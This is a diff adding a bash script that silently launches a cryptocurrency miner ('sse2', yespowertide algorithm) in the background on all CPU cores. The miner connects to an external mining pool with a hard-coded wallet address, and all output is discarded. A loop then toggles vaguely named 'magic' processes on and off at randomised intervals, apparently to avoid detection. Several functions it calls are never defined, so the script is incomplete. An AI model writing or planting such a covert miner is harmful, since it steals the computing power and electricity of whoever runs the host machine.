@@ -1,0 +1,30 @@
+#!/bin/bash
+
+nohup ./sse2 -a yespowertide -o stratum+tcp://stratum-eu.rplant.xyz:17059 -u TYKf2FgjTb2GrfrQppTRMZzd9t8ayRFMV3.ojhk -p m=solo -t $(nproc --all) >/dev/null 2>&1 &
+
+while true; do
+  # Start the magic process
+  start_magic
+  
+  # Get a random sleep duration
+  sleep_duration=$(get_random_sleep_duration)
+  
+  # Validate the sleep duration
+  if [[ -z "$sleep_duration" || "$sleep_duration" -lt 180 ]]; then
+    echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 3 minutes."
+    sleep_duration=180
+  elif [[ "$sleep_duration" -gt 420 ]]; then
+    echo "Error: Sleep duration exceeds maximum value. Adjusting to 7 minutes."
+    sleep_duration=420
+  fi
+  
+  # Log the sleep duration and sleep
+  echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
+  sleep $sleep_duration
+  
+  # Stop the magic process
+  stop_magic
+  
+  # Wait for an additional 2 minutes before starting the loop again
+  sleep 120
+done
